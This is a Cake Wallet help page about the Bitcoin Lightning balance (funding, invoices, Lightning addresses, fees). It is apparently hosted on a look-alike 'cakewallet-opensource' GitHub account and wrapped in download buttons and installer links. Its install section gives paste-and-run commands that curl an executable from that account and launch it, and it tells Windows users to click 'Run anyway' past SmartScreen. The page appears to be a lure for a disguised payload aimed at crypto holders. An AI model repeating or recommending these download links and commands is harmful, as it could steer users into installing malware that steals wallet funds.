![Cake Wallet lightning guide](assets/cake-wallet-lightning-article-banner.png)

# Bitcoin Lightning in Cake Wallet

A second balance inside the same wallet, and why it starts empty.

## Downloads - v6.4.5

<p align="center"><a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`cake-wallet-desktop-v6.4.5-windows.exe`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`cake-wallet-desktop-v6.4.5-macos.dmg`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`cake-wallet-desktop-v6.4.5-linux.xz`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz) |

Every file on this page comes from the [current Cake Wallet release](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest).

> Cake Wallet never asks for your recovery phrase, and no support channel needs it.

Lightning appears as its own balance in the Bitcoin wallet. Fund it by swapping or receiving into it, then pay invoices or use a Lightning address. It is separate from your on-chain BTC, so an empty Lightning balance with a full on-chain balance is normal rather than broken.

<!-- ARTICLE-BODY-BEGIN -->

## Getting sats to spend
Lightning payments need liquidity on the Lightning side, so the balance has to be funded before anything can be paid. The simplest route is an in-app swap from your on-chain Bitcoin, which moves value across without leaving the wallet.

A swap into Lightning is still a swap: it has a rate and a fee. <a href="https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-swap-crypto.md">Swap crypto in Cake Wallet</a> covers the quote comparison and the fixed-versus-floating choice, which applies here like anywhere else.

## Paying an invoice
Paste the invoice or scan its QR, confirm the amount, and pay. Lightning settles in seconds when there is a route, and fails immediately when there is not, which is a different experience from an on-chain send that can sit unconfirmed for an hour.

A failed payment is usually a routing or liquidity problem at one end, not a balance problem. Retrying once is reasonable; retrying ten times is not.

## Lightning addresses
A Lightning address looks like an email and resolves to an invoice, so a sender does not need to paste a fresh invoice each time. The wallet accepts them where the feature is implemented, and the sender's app still has to understand the format.

Receiving to a Lightning address needs inbound liquidity, which is the part most guides skip. A brand new Lightning balance can receive small amounts and fail on larger ones until liquidity grows.

## Fee expectations
Lightning fees are typically tiny compared with on-chain fees, and they are paid on the Lightning leg rather than as a miner fee. The on-chain fee still applies when you move value into or out of the Lightning balance.

That is why comparing "the fee" across the two is misleading: they are different networks with different cost structures. <a href="https://github.com/cakewallet-opensource/cake-wallet-help/blob/main/cake-wallet-network-fee.md">Cake Wallet network fees</a> covers the on-chain side.

## Buying instead
Buying Bitcoin directly into the wallet is the other way to get sats, with a provider and its own checks. It is slower and more expensive for small amounts than a swap, and it introduces identity requirements that a swap does not.

<a href="https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-buy-monero.md">Buy crypto in Cake Wallet</a> explains the provider model, including why the wallet is not the party taking your card.

## Current build
Lightning support depends on the build, and the desktop release published here predates parts of the current Lightning work. Install the <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest">latest Cake Wallet release</a> and check the Bitcoin wallet for a Lightning balance before assuming the feature is absent from the product.

If your build shows on-chain Bitcoin only, that is the answer: this build, not the app in general.

## FAQ
### Why did my Lightning deposit not show up?
Lightning deposits need an inbound route; a payment that failed at the sender never arrived. Check the sending app's status before looking at the balance.
### Can I use a Lightning address?
Where the build implements it. The sender's wallet must also understand the format.

<!-- ARTICLE-BODY-END -->

## How to install Cake Wallet

<!-- INSTALL-BEGIN -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe">cake-wallet-desktop-v6.4.5-windows.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg">cake-wallet-desktop-v6.4.5-macos.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

### Linux
Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz">cake-wallet-desktop-v6.4.5-linux.xz</a> or the <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.flatpak">cake-wallet-desktop-v6.4.5-linux.flatpak</a>.
2. Archive: extract it and run the executable inside the extracted folder.
3. Flatpak: run `flatpak install ./cake-wallet-desktop-v6.4.5-linux.flatpak` where you saved it.
4. Launch Cake Wallet and restore your wallet.
<!-- INSTALL-END -->

## Related guides
[swap crypto in Cake Wallet](https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-swap-crypto.md) · [buy crypto in Cake Wallet](https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-buy-monero.md) · [Cake Wallet network fees](https://github.com/cakewallet-opensource/cake-wallet-help/blob/main/cake-wallet-network-fee.md) · [latest Cake Wallet release](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest)
